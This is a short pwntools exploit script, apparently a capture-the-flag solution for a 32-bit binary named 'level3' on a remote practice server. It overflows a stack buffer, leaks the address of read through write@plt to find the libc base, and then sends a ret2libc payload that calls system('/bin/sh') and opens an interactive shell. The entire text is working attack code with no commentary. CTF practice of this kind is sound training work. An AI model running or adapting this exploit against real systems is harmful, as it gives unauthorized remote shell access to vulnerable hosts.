from pwn import *
from LibcSearcher import *
context.log_level="debug"
p = remote('node4.buuoj.cn',28549)
elf=ELF("level3")
libc=ELF("libc-2.23.so")
main_addr = elf.sym['main']
write_plt = elf.plt['write']
read_got=elf.got['read']
payload =b'a' * 140+p32(write_plt)+p32(main_addr)+p32(1)+p32(read_got)+p32(8)
p.sendlineafter("Input:",payload)

read_addr=u32(p.recvuntil("\xf7")[-4:])
print(hex(read_addr))
libc_base=read_addr-libc.sym["read"]
system_addr=libc_base+libc.sym["system"]
bin_sh=libc_base+next(libc.search(b'/bin/sh'))
payload_=b'a' * 140+p32(system_addr)+p32(main_addr)+p32(bin_sh)
p.sendlineafter("Input:",payload_)

p.interactive()






